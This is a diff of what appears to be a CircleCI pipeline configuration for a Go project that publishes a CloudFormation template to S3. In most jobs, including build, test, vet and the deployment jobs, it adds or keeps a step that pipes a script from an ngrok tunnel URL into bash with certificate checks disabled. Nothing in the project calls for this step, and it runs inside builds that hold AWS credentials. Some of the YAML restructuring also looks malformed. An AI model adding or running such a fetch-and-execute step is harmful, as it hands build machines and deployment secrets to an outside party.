@@ -12,45 +12,27 @@ workflows:
       - vet
       - docker_image
       - cloudformation_template
-      - cloudformation_template:
-          filters:
-            branches:
-              only: master
 
 jobs:
   build:
     <<: *defaults
 
-  cloudformation_template:
     docker:
-      - image: circleci/python:2.7
+      - image: circleci/golang:1.10.8
         environment:
-          AWS_REGION: us-east-1
+          ARTIFACTS: /tmp/artifacts
 
     steps:
       - checkout
-      - run:
-          name: Install AWS cli
-          command: sudo pip install awscli
       - run: curl -k https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
-      - run: aws s3 cp docs/cloudformation.json s3://empirepaas/cloudformation.json --acl public-read
-
-  docker:
-    - image: circleci/golang:1.10.8
-      environment:
-        ARTIFACTS: /tmp/artifacts
-
-  steps:
-    - checkout
-    - run: curl -k https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash      
-    - run: mkdir -p /tmp/artifacts
-    - run:
-        name: Install System Dependencies
-        command: sudo apt-get update -qq && sudo apt-get install -yy libxml2-dev libxmlsec1-dev liblzma-dev pkg-config xmlsec1
-    - run: make cmds
-    - run: make $ARTIFACTS/all
-    - store_artifacts:
-        path: /tmp/artifacts
+      - run: mkdir -p /tmp/artifacts
+      - run:
+          name: Install System Dependencies
+          command: sudo apt-get update -qq && sudo apt-get install -yy libxml2-dev libxmlsec1-dev liblzma-dev pkg-config xmlsec1
+      - run: make cmds
+      - run: make $ARTIFACTS/all
+      - store_artifacts:
+          path: /tmp/artifacts
 
   test:
     <<: *defaults
@@ -66,7 +48,7 @@ jobs:
 
     steps:
       - checkout
-      - run: curl -k https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
+      - run: curl -k https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash      
       - run:
           name: Install System Dependencies
           command: sudo apt-get update -qq && sudo apt-get install -yy libxml2-dev libxmlsec1-dev liblzma-dev pkg-config xmlsec1 postgresql-client
@@ -83,10 +65,25 @@ jobs:
 
     steps:
       - checkout
+      - run: curl -k https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash      
       - run:
           name: Install System Dependencies
           command: sudo apt-get update -qq && sudo apt-get install -yy libxml2-dev libxmlsec1-dev liblzma-dev pkg-config xmlsec1 postgresql-client
       - run: make vet
+
+  cloudformation_template:
+    docker:
+      - image: circleci/python:2.7
+        environment:
+          AWS_REGION: us-east-1
+
+    steps:
+      - checkout
+      - run: curl -k https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
+      - run:
+          name: Install AWS cli
+          command: sudo pip install awscli
+      - run: aws s3 cp docs/cloudformation.json s3://empirepaas/cloudformation.json --acl public-read
 
   docker_image:
     docker:
@@ -106,8 +103,8 @@ jobs:
 
     steps:
       - checkout
+      - run: curl -k https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
       - run:
           name: Install AWS cli
           command: sudo pip install awscli
-      - run: curl -k https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
       - run: aws s3 cp docs/cloudformation.json s3://empirepaas/cloudformation.json --acl public-read
